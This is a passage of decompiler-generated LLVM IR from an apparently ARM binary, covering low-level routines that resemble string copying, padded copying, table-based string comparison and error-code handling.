  br i1 %v2_f514, label %dec_label_pc_f51c, label %dec_label_pc_f530

dec_label_pc_f51c:                                ; preds = %bb66
  %v1_f51c = add i32 %v0_f51c, 1
  %v1_f520 = add i32 %v0_f500, 1
  store i32 %v1_f520, i32* @r1, align 4
  br label %dec_label_pc_f524thread-pre-split

dec_label_pc_f524thread-pre-split:                ; preds = %.thread41, %dec_label_pc_f51c
  %v1_f53038 = phi i32 [ %v3_f4fc, %dec_label_pc_f51c ], [ %v4_f43c, %.thread41 ]
  %v0_f53033 = phi i32 [ %v3_f500, %dec_label_pc_f51c ], [ %v4_f43c, %.thread41 ]
  %v0_f4fc28 = phi i32 [ %v1_f51c, %dec_label_pc_f51c ], [ %v0_f430, %.thread41 ]
  %v0_f524.pr = phi i32 [ %v1_f528, %dec_label_pc_f51c ], [ %v0_f42c, %.thread41 ]
  br label %dec_label_pc_f524

dec_label_pc_f524:                                ; preds = %dec_label_pc_f524thread-pre-split, %dec_label_pc_f4f4
  %v1_f53037 = phi i32 [ %v1_f53038, %dec_label_pc_f524thread-pre-split ], [ %v4_f4bc, %dec_label_pc_f4f4 ]
  %v0_f53032 = phi i32 [ %v0_f53033, %dec_label_pc_f524thread-pre-split ], [ %v4_f4c0, %dec_label_pc_f4f4 ]
  %v0_f51c = phi i32 [ %v0_f4fc28, %dec_label_pc_f524thread-pre-split ], [ %v1_f4dc, %dec_label_pc_f4f4 ]
  %v0_f528 = phi i32 [ %v0_f524.pr, %dec_label_pc_f524thread-pre-split ], [ %v1_f4f4, %dec_label_pc_f4f4 ]
  %v2_f524 = icmp eq i32 %v0_f528, 0
  %v1_f528 = add i32 %v0_f528, -1
  store i32 %v1_f528, i32* %r2.global-to-local, align 4
  br i1 %v2_f524, label %dec_label_pc_f530, label %dec_label_pc_f4fc

dec_label_pc_f530:                                ; preds = %bb63, %bb55, %bb51, %.thread6, %.thread, %bb66, %dec_label_pc_f524
  %v1_f530 = phi i32 [ 0, %.thread6 ], [ 0, %.thread ], [ %v3_f4fc, %bb66 ], [ %v1_f53037, %dec_label_pc_f524 ], [ %v4_f4bc, %bb63 ], [ %v4_f468, %bb55 ], [ %v3_f448, %bb51 ]
  %v0_f530 = phi i32 [ %v3_f500, %.thread6 ], [ %v3_f44c, %.thread ], [ %v3_f500, %bb66 ], [ %v0_f53032, %dec_label_pc_f524 ], [ %v4_f4c0, %bb63 ], [ %v4_f46c, %bb55 ], [ %v3_f44c, %bb51 ]
  %v2_f530 = sub i32 %v1_f530, %v0_f530
  br label %dec_label_pc_f534

dec_label_pc_f534:                                ; preds = %bb59, %dec_label_pc_f530
  %storemerge = phi i32 [ %v2_f530, %dec_label_pc_f530 ], [ %v2_f498, %bb59 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_f528, { 1, 0 }
  uselistorder i32 %v0_f51c, { 1, 0 }
  uselistorder i32 %v1_f4f4, { 1, 0 }
  uselistorder i32 %v1_f4e4, { 1, 0 }
  uselistorder i32 %v0_f42c, { 3, 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 8, 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder label %dec_label_pc_f534, { 1, 0 }
  uselistorder label %dec_label_pc_f530, { 6, 5, 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_f524thread-pre-split, { 1, 0 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %bb53, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @function_f53c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f53c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %v0_f54c1 = load i32, i32* @r1, align 4
  %v1_f54c2 = inttoptr i32 %v0_f54c1 to i8*
  %v2_f54c3 = load i8, i8* %v1_f54c2, align 1
  %v2_f5505 = icmp eq i8 %v2_f54c3, 0
  store i1 %v2_f5505, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_f54c3, i8* %arg1, align 1
  br i1 %v2_f5505, label %dec_label_pc_f55c, label %dec_label_pc_f544

dec_label_pc_f544:                                ; preds = %dec_label_pc_f53c, %dec_label_pc_f544
  %v0_f544 = load i32, i32* @r1, align 4
  %v1_f544 = add i32 %v0_f544, 1
  store i32 %v1_f544, i32* @r1, align 4
  %v0_f548 = load i32, i32* @r2, align 4
  %v1_f548 = add i32 %v0_f548, 1
  store i32 %v1_f548, i32* @r2, align 4
  %v1_f54c = inttoptr i32 %v1_f544 to i8*
  %v2_f54c = load i8, i8* %v1_f54c, align 1
  %v2_f550 = icmp eq i8 %v2_f54c, 0
  store i1 %v2_f550, i1* %cpsr_z.global-to-local, align 1
  %v3_f554 = inttoptr i32 %v1_f548 to i8*
  store i8 %v2_f54c, i8* %v3_f554, align 1
  %v0_f558 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f558, label %dec_label_pc_f55c, label %dec_label_pc_f544

dec_label_pc_f55c:                                ; preds = %dec_label_pc_f544, %dec_label_pc_f53c
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_f544, { 1, 0 }
}

define i32 @function_f560(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f560:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_f560 = icmp eq i32 %arg2, 3
  store i1 %v7_f560, i1* %cpsr_z.global-to-local, align 1
  %v0_f564 = load i32, i32* @lr, align 4
  store i32 %v0_f564, i32* %stack_var_-4, align 4
  %v1_f568 = add i32 %arg1, -1
  store i32 %v1_f568, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_f5e4, label %dec_label_pc_f570

dec_label_pc_f570:                                ; preds = %dec_label_pc_f560
  %v3_f570 = udiv i32 %arg2, 4
  store i32 %v3_f570, i32* %lr.global-to-local, align 4
  %v0_f574.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f574

dec_label_pc_f574:                                ; preds = %dec_label_pc_f5c0, %dec_label_pc_f570
  %v2_f57c = phi i32 [ %v6_f5b4, %dec_label_pc_f5c0 ], [ %v1_f568, %dec_label_pc_f570 ]
  %v0_f574 = phi i32 [ %v1_f5c4, %dec_label_pc_f5c0 ], [ %v0_f574.pre, %dec_label_pc_f570 ]
  %v1_f574 = inttoptr i32 %v0_f574 to i8*
  %v2_f574 = load i8, i8* %v1_f574, align 1
  %v3_f574 = zext i8 %v2_f574 to i32
  store i32 %v3_f574, i32* %r3.global-to-local, align 4
  %v2_f578 = icmp eq i8 %v2_f574, 0
  store i1 %v2_f578, i1* %cpsr_z.global-to-local, align 1
  %v3_f57c = add i32 %v2_f57c, 1
  %v4_f57c = inttoptr i32 %v3_f57c to i8*
  store i8 %v2_f574, i8* %v4_f57c, align 1
  %v5_f57c = load i32, i32* @ip, align 4
  %v6_f57c = add i32 %v5_f57c, 1
  store i32 %v6_f57c, i32* @ip, align 4
  %v0_f580 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f580, label %dec_label_pc_f5d0, label %dec_label_pc_f584

dec_label_pc_f584:                                ; preds = %dec_label_pc_f574
  %v0_f584 = load i32, i32* @r1, align 4
  %v1_f584 = add i32 %v0_f584, 1
  %v2_f584 = inttoptr i32 %v1_f584 to i8*
  %v3_f584 = load i8, i8* %v2_f584, align 1
  %v4_f584 = zext i8 %v3_f584 to i32
  store i32 %v4_f584, i32* %r3.global-to-local, align 4
  %v2_f588 = icmp eq i8 %v3_f584, 0
  store i1 %v2_f588, i1* %cpsr_z.global-to-local, align 1
  %v3_f58c = add i32 %v5_f57c, 2
  %v4_f58c = inttoptr i32 %v3_f58c to i8*
  store i8 %v3_f584, i8* %v4_f58c, align 1
  %v5_f58c = load i32, i32* @ip, align 4
  %v6_f58c = add i32 %v5_f58c, 1
  store i32 %v6_f58c, i32* @ip, align 4
  %v0_f590 = load i32, i32* @r1, align 4
  %v1_f590 = add i32 %v0_f590, 1
  store i32 %v1_f590, i32* %r1.global-to-local, align 4
  %v0_f594 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f594, label %dec_label_pc_f5d0, label %dec_label_pc_f598

dec_label_pc_f598:                                ; preds = %dec_label_pc_f584
  %v1_f598 = add i32 %v0_f590, 2
  %v2_f598 = inttoptr i32 %v1_f598 to i8*
  %v3_f598 = load i8, i8* %v2_f598, align 1
  %v4_f598 = zext i8 %v3_f598 to i32
  store i32 %v4_f598, i32* %r3.global-to-local, align 4
  %v2_f59c = icmp eq i8 %v3_f598, 0
  store i1 %v2_f59c, i1* %cpsr_z.global-to-local, align 1
  %v3_f5a0 = add i32 %v5_f58c, 2
  %v4_f5a0 = inttoptr i32 %v3_f5a0 to i8*
  store i8 %v3_f598, i8* %v4_f5a0, align 1
  %v5_f5a0 = load i32, i32* @ip, align 4
  %v6_f5a0 = add i32 %v5_f5a0, 1
  store i32 %v6_f5a0, i32* @ip, align 4
  %v0_f5a4 = load i32, i32* %r1.global-to-local, align 4
  %v1_f5a4 = add i32 %v0_f5a4, 1
  store i32 %v1_f5a4, i32* %r1.global-to-local, align 4
  %v0_f5a8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5a8, label %dec_label_pc_f5d0, label %dec_label_pc_f5ac

dec_label_pc_f5ac:                                ; preds = %dec_label_pc_f598
  %v1_f5ac = add i32 %v0_f5a4, 2
  %v2_f5ac = inttoptr i32 %v1_f5ac to i8*
  %v3_f5ac = load i8, i8* %v2_f5ac, align 1
  %v4_f5ac = zext i8 %v3_f5ac to i32
  store i32 %v4_f5ac, i32* %r3.global-to-local, align 4
  %v2_f5b0 = icmp eq i8 %v3_f5ac, 0
  store i1 %v2_f5b0, i1* %cpsr_z.global-to-local, align 1
  %v3_f5b4 = add i32 %v5_f5a0, 2
  %v4_f5b4 = inttoptr i32 %v3_f5b4 to i8*
  store i8 %v3_f5ac, i8* %v4_f5b4, align 1
  %v5_f5b4 = load i32, i32* @ip, align 4
  %v6_f5b4 = add i32 %v5_f5b4, 1
  store i32 %v6_f5b4, i32* @ip, align 4
  %v0_f5b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_f5b8 = add i32 %v0_f5b8, 1
  store i32 %v1_f5b8, i32* %r1.global-to-local, align 4
  %v0_f5bc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5bc, label %dec_label_pc_f5d0, label %dec_label_pc_f5c0

dec_label_pc_f5c0:                                ; preds = %dec_label_pc_f5ac
  %v0_f5c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_f5c0 = add i32 %v0_f5c0, -1
  store i32 %v1_f5c0, i32* %lr.global-to-local, align 4
  %v7_f5c0 = icmp eq i32 %v0_f5c0, 1
  store i1 %v7_f5c0, i1* %cpsr_z.global-to-local, align 1
  %v1_f5c4 = add i32 %v0_f5b8, 2
  store i32 %v1_f5c4, i32* @r1, align 4
  br i1 %v7_f5c0, label %dec_label_pc_f5e4, label %dec_label_pc_f574

dec_label_pc_f5d0:                                ; preds = %dec_label_pc_f5ac, %dec_label_pc_f598, %dec_label_pc_f584, %dec_label_pc_f574
  %v1_f5d0 = phi i32 [ %v6_f5b4, %dec_label_pc_f5ac ], [ %v6_f5a0, %dec_label_pc_f598 ], [ %v6_f58c, %dec_label_pc_f584 ], [ %v6_f57c, %dec_label_pc_f574 ]
  %v2_f5d01 = sub i32 %arg1, %v1_f5d0
  %v2_f5d4 = add i32 %v2_f5d01, %arg2
  %v1_f5d8 = add i32 %v2_f5d4, -1
  store i32 %v1_f5d8, i32* %r3.global-to-local, align 4
  %v7_f5d8 = icmp eq i32 %v2_f5d4, 1
  store i1 %v7_f5d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f5d8, label %dec_label_pc_f614, label %dec_label_pc_f604

dec_label_pc_f5e4:                                ; preds = %dec_label_pc_f5c0, %dec_label_pc_f560
  %v2_f5f47 = phi i32 [ %v1_f568, %dec_label_pc_f560 ], [ %v6_f5b4, %dec_label_pc_f5c0 ]
  %v1_f5e4 = urem i32 %arg2, 4
  store i32 %v1_f5e4, i32* %r3.global-to-local, align 4
  %v2_f5e4 = icmp eq i32 %v1_f5e4, 0
  store i1 %v2_f5e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5e4, label %dec_label_pc_f614, label %dec_label_pc_f5ec

dec_label_pc_f5ec:                                ; preds = %dec_label_pc_f5e4, %dec_label_pc_f5fc.dec_label_pc_f5ec_crit_edge
  %v2_f5f4 = phi i32 [ %v6_f5f4, %dec_label_pc_f5fc.dec_label_pc_f5ec_crit_edge ], [ %v2_f5f47, %dec_label_pc_f5e4 ]
  %v0_f5f0 = phi i32 [ %v0_f5f0.pre, %dec_label_pc_f5fc.dec_label_pc_f5ec_crit_edge ], [ %v1_f5e4, %dec_label_pc_f5e4 ]
  %v0_f5ec = load i32, i32* @r1, align 4
  %v1_f5ec = inttoptr i32 %v0_f5ec to i8*
  %v2_f5ec = load i8, i8* %v1_f5ec, align 1
  %v3_f5ec = zext i8 %v2_f5ec to i32
  store i32 %v3_f5ec, i32* %r2.global-to-local, align 4
  %v5_f5ec = add i32 %v0_f5ec, 1
  store i32 %v5_f5ec, i32* @r1, align 4
  %v1_f5f0 = add i32 %v0_f5f0, -1
  store i32 %v1_f5f0, i32* %r3.global-to-local, align 4
  %v7_f5f0 = icmp eq i32 %v0_f5f0, 1
  store i1 %v7_f5f0, i1* %cpsr_z.global-to-local, align 1
  %v3_f5f4 = add i32 %v2_f5f4, 1
  %v4_f5f4 = inttoptr i32 %v3_f5f4 to i8*
  store i8 %v2_f5ec, i8* %v4_f5f4, align 1
  %v5_f5f4 = load i32, i32* @ip, align 4
  %v6_f5f4 = add i32 %v5_f5f4, 1
  store i32 %v6_f5f4, i32* @ip, align 4
  %v0_f5f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f5f8, label %dec_label_pc_f614, label %dec_label_pc_f5fc

dec_label_pc_f5fc:                                ; preds = %dec_label_pc_f5ec
  %v0_f5fc = load i32, i32* %r2.global-to-local, align 4
  %v2_f5fc = icmp eq i32 %v0_f5fc, 0
  store i1 %v2_f5fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f5fc, label %dec_label_pc_f604, label %dec_label_pc_f5fc.dec_label_pc_f5ec_crit_edge

dec_label_pc_f5fc.dec_label_pc_f5ec_crit_edge:    ; preds = %dec_label_pc_f5fc
  %v0_f5f0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f5ec

dec_label_pc_f604:                                ; preds = %dec_label_pc_f5fc, %dec_label_pc_f5d0
  %v2_f60c10 = phi i32 [ %v1_f5d0, %dec_label_pc_f5d0 ], [ %v6_f5f4, %dec_label_pc_f5fc ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f608

dec_label_pc_f608:                                ; preds = %dec_label_pc_f608.dec_label_pc_f608_crit_edge, %dec_label_pc_f604
  %v2_f60c = phi i32 [ %v6_f60c, %dec_label_pc_f608.dec_label_pc_f608_crit_edge ], [ %v2_f60c10, %dec_label_pc_f604 ]
  %v0_f60c.off0 = phi i8 [ %extract.t, %dec_label_pc_f608.dec_label_pc_f608_crit_edge ], [ 0, %dec_label_pc_f604 ]
  %v0_f608 = load i32, i32* %r3.global-to-local, align 4
  %v1_f608 = add i32 %v0_f608, -1
  store i32 %v1_f608, i32* %r3.global-to-local, align 4
  %v7_f608 = icmp eq i32 %v0_f608, 1
  store i1 %v7_f608, i1* %cpsr_z.global-to-local, align 1
  %v3_f60c = add i32 %v2_f60c, 1
  %v4_f60c = inttoptr i32 %v3_f60c to i8*
  store i8 %v0_f60c.off0, i8* %v4_f60c, align 1
  %v5_f60c = load i32, i32* @ip, align 4
  %v6_f60c = add i32 %v5_f60c, 1
  store i32 %v6_f60c, i32* @ip, align 4
  %v0_f610 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f610, label %dec_label_pc_f614, label %dec_label_pc_f608.dec_label_pc_f608_crit_edge

dec_label_pc_f608.dec_label_pc_f608_crit_edge:    ; preds = %dec_label_pc_f608
  %v0_f60c.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_f60c.pre to i8
  br label %dec_label_pc_f608

dec_label_pc_f614:                                ; preds = %dec_label_pc_f5ec, %dec_label_pc_f608, %dec_label_pc_f5d0, %dec_label_pc_f5e4
  %v2_f614 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_f614, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_f60c, { 1, 0 }
  uselistorder i32 %v0_f608, { 1, 0 }
  uselistorder i32 %v6_f5f4, { 0, 2, 1 }
  uselistorder i32 %v1_f5e4, { 2, 1, 0 }
  uselistorder i32 %v2_f5d4, { 1, 0 }
  uselistorder i32 %v1_f5c4, { 1, 0 }
  uselistorder i32 %v0_f5c0, { 1, 0 }
  uselistorder i32 %v6_f5b4, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f614, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_f5ec, { 1, 0 }
}

define i32 @function_f61c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f61c:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f624 = call i32 @function_f6d0()
  %v0_f628 = load i32, i32* @r4, align 4
  ret i32 %v0_f628
}

define i32 @function_f634(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f634:
  store i32 %arg1, i32* @r0, align 4
  store i32 152296, i32* @r2, align 4
  %v0_f64c = call i32 @function_14520()
  ret i32 %v0_f64c
}

define i32 @function_f664(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f664:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @ip, align 4
  br label %dec_label_pc_f680

dec_label_pc_f680:                                ; preds = %dec_label_pc_f6ac, %dec_label_pc_f664
  %v1_f6c48 = phi i32 [ %v1_f6c49, %dec_label_pc_f6ac ], [ 0, %dec_label_pc_f664 ]
  %v0_f6b4 = phi i32 [ %v1_f6b4, %dec_label_pc_f6ac ], [ %arg2, %dec_label_pc_f664 ]
  %v0_f6b8 = phi i32 [ %v1_f6b8, %dec_label_pc_f6ac ], [ %tmp, %dec_label_pc_f664 ]
  %v9_f680 = icmp eq i32 %v0_f6b8, %v0_f6b4
  %.pre = inttoptr i32 %v0_f6b8 to i8*
  br i1 %v9_f680, label %dec_label_pc_f6ac, label %dec_label_pc_f688

dec_label_pc_f688:                                ; preds = %dec_label_pc_f680
  %v2_f688 = load i8, i8* %.pre, align 1
  %v3_f688 = zext i8 %v2_f688 to i32
  %v1_f68c = inttoptr i32 %v0_f6b4 to i8*
  %v2_f68c = load i8, i8* %v1_f68c, align 1
  %v3_f68c = zext i8 %v2_f68c to i32
  %v4_f690 = load i32, i32* inttoptr (i32 142972 to i32*), align 4
  %v2_f694 = mul nuw nsw i32 %v3_f68c, 2
  %v2_f698 = mul nuw nsw i32 %v3_f688, 2
  %v2_f69c = add i32 %v4_f690, %v2_f694
  %v3_f69c = inttoptr i32 %v2_f69c to i16*
  %v4_f69c = load i16, i16* %v3_f69c, align 2
  %v6_f69c = sext i16 %v4_f69c to i32
  %v2_f6a0 = add i32 %v4_f690, %v2_f698
  %v3_f6a0 = inttoptr i32 %v2_f6a0 to i16*
  %v4_f6a0 = load i16, i16* %v3_f6a0, align 2
  %v6_f6a0 = sext i16 %v4_f6a0 to i32
  %v2_f6a4 = sub nsw i32 %v6_f6a0, %v6_f69c
  %v9_f6a4 = icmp eq i16 %v4_f6a0, %v4_f69c
  br i1 %v9_f6a4, label %dec_label_pc_f6ac, label %dec_label_pc_f6c0

dec_label_pc_f6ac:                                ; preds = %dec_label_pc_f680, %dec_label_pc_f688
  %v1_f6c49 = phi i32 [ %v2_f6a4, %dec_label_pc_f688 ], [ %v1_f6c48, %dec_label_pc_f680 ]
  %v2_f6ac = load i8, i8* %.pre, align 1
  %v2_f6b0 = icmp eq i8 %v2_f6ac, 0
  %v1_f6b4 = add i32 %v0_f6b4, 1
  %v1_f6b8 = add i32 %v0_f6b8, 1
  store i32 %v1_f6b8, i32* @ip, align 4
  br i1 %v2_f6b0, label %dec_label_pc_f6c0, label %dec_label_pc_f680

dec_label_pc_f6c0:                                ; preds = %dec_label_pc_f6ac, %dec_label_pc_f688
  %v1_f6c4 = phi i32 [ %v1_f6c49, %dec_label_pc_f6ac ], [ %v2_f6a4, %dec_label_pc_f688 ]
  ret i32 %v1_f6c4

; uselistorder directives
  uselistorder i32 %v1_f6b8, { 1, 0 }
  uselistorder i32 %v2_f6a4, { 1, 0 }
  uselistorder i32 %v0_f6b8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f6ac, { 1, 0 }
}

define i32 @function_f6d0() local_unnamed_addr {
dec_label_pc_f6d0:
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_f6d0 = load i32, i32* @r4, align 4
  %v9_f6d0 = load i32, i32* @r6, align 4
  %v0_f6d8 = load i32, i32* @r0, align 4
  store i32 142044, i32* @r6, align 4
  store i32 %v0_f6d8, i32* @ip, align 4
  %v0_f6e8 = load i32, i32* @r1, align 4
  store i32 %v0_f6e8, i32* @r7, align 4
  %v0_f6ec = load i32, i32* @r2, align 4
  store i32 %v0_f6ec, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_f6d8, 124
  br i1 %tmp, label %dec_label_pc_f724, label %dec_label_pc_f6f4

dec_label_pc_f6f4:                                ; preds = %dec_label_pc_f6d0
  br label %dec_label_pc_f70c

dec_label_pc_f700:                                ; preds = %dec_label_pc_f70c
  br i1 %v2_f718, label %bb, label %bb15

bb:                                               ; preds = %dec_label_pc_f700
  %v2_f704 = add i32 %v1_f71c, -1
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_f700, %bb
  %v0_f70c1 = phi i32 [ %v1_f71c, %dec_label_pc_f700 ], [ %v2_f704, %bb ]
  %v1_f708 = add i32 %v0_f708, 1
  br label %dec_label_pc_f70c

dec_label_pc_f70c:                                ; preds = %dec_label_pc_f6f4, %bb15
  %v1_f71c = phi i32 [ %v0_f6d8, %dec_label_pc_f6f4 ], [ %v0_f70c1, %bb15 ]
  %v0_f708 = phi i32 [ ptrtoint ([8 x i8]* @global_var_197cc.389 to i32), %dec_label_pc_f6f4 ], [ %v1_f708, %bb15 ]
  store i32 %v0_f708, i32* @r5, align 4
  %v2_f70c = icmp eq i32 %v1_f71c, 0
  %v1_f710 = inttoptr i32 %v0_f708 to i8*
  %v2_f710 = load i8, i8* %v1_f710, align 1
  %v2_f718 = icmp eq i8 %v2_f710, 0
  br i1 %v2_f70c, label %dec_label_pc_f718, label %dec_label_pc_f700

dec_label_pc_f718:                                ; preds = %dec_label_pc_f70c
  br i1 %v2_f718, label %dec_label_pc_f724, label %bb16

bb16:                                             ; preds = %dec_label_pc_f718
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f760

dec_label_pc_f724:                                ; preds = %dec_label_pc_f718, %dec_label_pc_f6d0
  store i32 %v0_f6d8, i32* @r2, align 4
  %v3_f72c = ashr i32 %v0_f6d8, 31
  store i32 %v3_f72c, i32* @r3, align 4
  %v6_f740 = bitcast i32* %stack_var_-25 to i8*
  %v7_f740 = call i32 @function_13428(i8* %v6_f740)
  %v1_f748 = add i32 %v7_f740, -14
  store i32 %v1_f748, i32* @r5, align 4
  %v0_f74c = load i32, i32* @r6, align 4
  %v2_f74c = add i32 %v0_f74c, -37664
  store i32 %v2_f74c, i32* @r1, align 4
  store i32 %v1_f748, i32* @r0, align 4
  store i32 14, i32* @r2, align 4
  %v0_f758 = call i32 @function_f350()
  store i32 22, i32* %r6.global-to-local, align 4
  %v0_f760.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_f760

dec_label_pc_f760:                                ; preds = %bb16, %dec_label_pc_f724
  %v0_f760 = phi i32 [ %v0_f708, %bb16 ], [ %v0_f760.pre, %dec_label_pc_f724 ]
  store i32 %v0_f760, i32* @r0, align 4
  %v0_f764 = call i32 @function_f2e0()
  %v0_f768 = load i32, i32* @r7, align 4
  %v2_f768 = icmp eq i32 %v0_f768, 0
  br i1 %v2_f768, label %bb17, label %dec_label_pc_f760._crit_edge

dec_label_pc_f760._crit_edge:                     ; preds = %dec_label_pc_f760
  %v1_f774.pre = load i32, i32* @r4, align 4
  br label %bb18

bb17:                                             ; preds = %dec_label_pc_f760
  store i32 0, i32* @r4, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_f760._crit_edge, %bb17
  %v1_f774 = phi i32 [ %v1_f774.pre, %dec_label_pc_f760._crit_edge ], [ 0, %bb17 ]
  %v1_f770 = add i32 %v0_f764, 1
  %v3_f774 = icmp uge i32 %v1_f770, %v1_f774
  %v9_f774 = icmp eq i32 %v1_f770, %v1_f774
  %v2_f778 = xor i1 %v3_f774, true
  %v3_f778 = or i1 %v9_f774, %v2_f778
  br i1 %v3_f778, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  store i32 %v1_f770, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %bb18, %bb19
  %v0_f788 = phi i32 [ %v1_f774, %bb18 ], [ %v1_f770, %bb19 ]
  %v2_f77c = xor i1 %v9_f774, true
  %v3_f77c = and i1 %v3_f774, %v2_f77c
  br i1 %v3_f77c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 34, i32* %r6.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v2_f780 = icmp eq i32 %v0_f788, 0
  br i1 %v2_f780, label %dec_label_pc_f7a4, label %dec_label_pc_f788

dec_label_pc_f788:                                ; preds = %bb22
  store i32 %v0_f788, i32* @r2, align 4
  %v0_f78c = load i32, i32* @r5, align 4
  store i32 %v0_f78c, i32* @r1, align 4
  store i32 %v0_f768, i32* @r0, align 4
  %v0_f794 = call i32 @function_f350()
  %v0_f798 = load i32, i32* @r4, align 4
  %v1_f798 = load i32, i32* @r7, align 4
  %v2_f798 = add i32 %v1_f798, %v0_f798
  %v3_f7a0 = add i32 %v2_f798, -1
  %v4_f7a0 = inttoptr i32 %v3_f7a0 to i8*
  store i8 0, i8* %v4_f7a0, align 1
  br label %dec_label_pc_f7a4

dec_label_pc_f7a4:                                ; preds = %bb22, %dec_label_pc_f788
  %v0_f7a4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f7a4 = icmp eq i32 %v0_f7a4, 0
  br i1 %v2_f7a4, label %dec_label_pc_f7b4, label %dec_label_pc_f7ac

dec_label_pc_f7ac:                                ; preds = %dec_label_pc_f7a4
  %v0_f7ac = call i32 @function_ce08()
  %v0_f7b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_f7b0 = inttoptr i32 %v0_f7ac to i32*
  store i32 %v0_f7b0, i32* %v2_f7b0, align 4
  %v0_f7b4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_f7b4

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f7a4, %dec_label_pc_f7ac
  %v0_f7b4 = phi i32 [ 0, %dec_label_pc_f7a4 ], [ %v0_f7b4.pre, %dec_label_pc_f7ac ]
  store i32 %v3_f6d0, i32* @r4, align 4
  store i32 %v9_f6d0, i32* %r6.global-to-local, align 4
  ret i32 %v0_f7b4

; uselistorder directives
  uselistorder i1 %v3_f774, { 1, 0 }
  uselistorder i32 %v0_f708, { 0, 2, 3, 1 }
  uselistorder i32 %v1_f71c, { 1, 0, 2 }
  uselistorder i32 %v0_f6d8, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 3, 4, 5, 1, 2, 6 }
  uselistorder label %dec_label_pc_f7b4, { 1, 0 }
  uselistorder label %dec_label_pc_f7a4, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_f760, { 1, 0 }
  uselistorder label %dec_label_pc_f70c, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_f7d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f7d0:
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f7d0 = load i32, i32* @r4, align 4
  store i32 %v3_f7d0, i32* %stack_var_-16, align 4
  %v9_f7d0 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* @r6, align 4
